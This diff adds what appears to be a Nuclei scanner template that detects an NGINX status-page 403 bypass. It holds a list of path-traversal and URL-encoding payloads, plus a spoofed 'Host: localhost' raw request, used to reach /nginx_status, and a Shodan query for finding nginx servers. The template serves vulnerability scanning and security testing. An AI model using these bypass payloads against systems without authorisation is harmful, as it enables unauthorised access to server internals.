@@ -1,0 +1,72 @@
+id: nginx-status-403-bypass
+
+info:
+  name: Nginx Status Page - 403 Bypass
+  author: pussycat0x
+  severity: low
+  description: |
+    Detected an NGINX status disclosure and a 403 bypass that allowed unauthorized access to the /nginx_status endpoint.
+  reference:
+    - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx
+  classification:
+    cwe-id: CWE-22
+  metadata:
+    verified: true
+    shodan-query: "server:nginx"
+  tags: nginx,status,disclosure,bypass,misconfig
+
+flow: http(1) && (http(2) || http (3))
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/nginx_status"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 403"
+        internal: true
+
+  - method: GET
+    path:
+      - "{{BaseURL}}{{paths}}"
+
+    attack: clusterbomb
+    payloads:
+      paths:
+        - "/../nginx_status"
+        - "/./nginx_status"
+        - "/.//nginx_status"
+        - "/./..;/nginx_status"
+        - "/%2e%2e/nginx_status"
+        - "/./%252e%252e/nginx_status"
+        - "/./%6e%67%69%6e%78_%73%74%61%74%75%73"
+        - "/;/nginx_status"
+        - "/./?/nginx_status"
+        - "/./nginx_status;"
+        - "/./nginx_status%20"
+        - "/./nginx_status/"
+
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "Active connections:")'
+        condition: and
+
+  - raw:
+      - |
+        @Host: localhost
+        GET /nginx_status HTTP/1.1
+        Host: localhost
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "Active connections:")'
+        condition: and
+# digest: 4a0a00473045022100dfd848ecc70909cd1d833ea5051419a90b3fffe0fa3be5cd7a5b338277caecb402204e75641d67e37ed61daebaba3b336e03f17c1493e9ee34515b038cb467575651:922c64590222798bb761d5b6d8e72950
